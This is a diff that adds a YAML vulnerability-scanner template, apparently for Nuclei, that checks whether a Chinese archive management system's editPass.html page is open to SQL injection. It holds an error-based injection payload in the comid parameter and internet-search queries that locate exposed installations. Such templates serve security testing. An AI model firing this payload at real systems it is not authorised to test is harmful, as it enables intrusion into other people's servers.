@@ -1,0 +1,28 @@
+id: thams-editPass-sqli
+info:
+  name: 紫光档案管理系统 editPass.html - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-ziguang-dianzi-manage-sqli.yml
+  metadata:
+    verified: true
+    fofa-query: app="紫光档案管理系统"
+    hunter-query: app.name="紫光档案管理系统"
+    quake-query: app:"紫光档案管理系统登录入口"
+    zoomeye-query: iconhash:"3e2ee25dc73811fe2a697deefe447017"
+  tags: thams,sqli
+
+http:
+  - raw:
+      - |
+        GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1))) HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,'XPATH syntax error')
+          - contains(body,'c4ca4238a0b923820dcc509a6f')
+        condition: or
